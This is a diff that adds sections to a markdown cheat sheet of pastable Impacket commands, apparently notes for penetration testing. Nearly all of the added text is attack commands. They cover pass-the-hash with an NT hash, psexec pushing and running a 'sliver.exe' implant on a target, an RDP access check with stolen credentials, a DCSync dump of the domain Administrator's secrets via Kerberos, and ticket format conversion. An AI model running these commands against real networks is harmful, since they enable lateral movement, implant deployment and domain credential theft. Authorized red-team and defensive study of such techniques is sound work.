@@ -1,5 +1,54 @@
 # Impacket Pastable Commands
 
+### wmiexec2 — Pass the Hash with NT Hash Only
+
+When you only have the NT hash, prefix with `:` (no LM hash needed):
+
+```bash
+python3 wmiexec2.py ./Administrator@TARGET -hashes ':NT_HASH' -shell-type powershell
+python3 wmiexec2.py DOMAIN/Administrator@TARGET -hashes ':fd02e525dd676fd8ca04e200d265f20c' -shell-type powershell
+```
+
+### impacket-psexec — Push and Execute Binary
+
+Use `-c` to upload a local binary and execute it on the target:
+
+```bash
+impacket-psexec DOMAIN/user:"password"@TARGET -c /tmp/sliver.exe
+impacket-psexec ./user:"password"@TARGET -c /tmp/sliver.exe
+```
+
+### impacket-rdp_check — Verify RDP Access
+
+Check if credentials grant RDP access before launching a full RDP session:
+
+```bash
+impacket-rdp_check DOMAIN/user:'password'@TARGET
+
+# Access Granted = can RDP
+# Access Denied = cannot RDP
+```
+
+### impacket-secretsdump — DCSync with Kerberos
+
+When you have a Kerberos TGT (e.g. from pass-the-certificate):
+
+```bash
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip DC_IP DOMAIN/dc01\$@dc01.domain.local
+```
+
+### impacket-ticketConverter
+
+Convert between ccache and kirbi ticket formats:
+
+```bash
+impacket-ticketConverter /tmp/julio.ccache julio.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
+
+---
+
 ### impacket-mssqlclient
 
 ```
